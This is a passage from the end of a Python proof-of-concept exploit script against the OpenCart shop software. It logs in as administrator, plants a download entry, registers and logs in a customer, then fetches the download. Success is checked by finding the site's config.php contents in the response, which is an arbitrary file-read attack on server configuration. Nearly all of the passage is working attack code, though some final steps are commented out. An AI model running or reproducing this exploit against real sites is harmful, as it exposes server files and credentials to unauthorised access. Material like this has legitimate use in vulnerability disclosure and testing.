    burp0_cookies = {"OCSESSID":cus_cookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
    burp0_headers = {"Referer": "https://"+host+"/index.php?route=account/download", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    r_check=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
    #print(r.status_code)
    #print(r_check.text)
    return r_check

def check_poc(r_check):
    if("define('DIR_APPLICATION', '/opt/bitnami/opencart/catalog/');" in r_check.text):
        print('PoC success!')
        return 0
    else:
        print('PoC failed!')
        return -1


if __name__ == "__main__":
    n=loginad()
    adcookies=n[0]
    adtoken=n[1]
    print(adcookies)
    print(adtoken)   
    addfile(adcookies,adtoken)
    n1=setfile(adcookies,adtoken)
    print("poc run ")
    register(adcookies,adtoken)
    cus_cookies=logincus()
    # addcart()
    # checkout()
    # r_check=download()
    # result=check_poc(r_check)
    # exit(result)
    
    # if (n1==200 and n2==200):
    #     print("PoC success!")
    # else:
    #     print("PoC failed!")







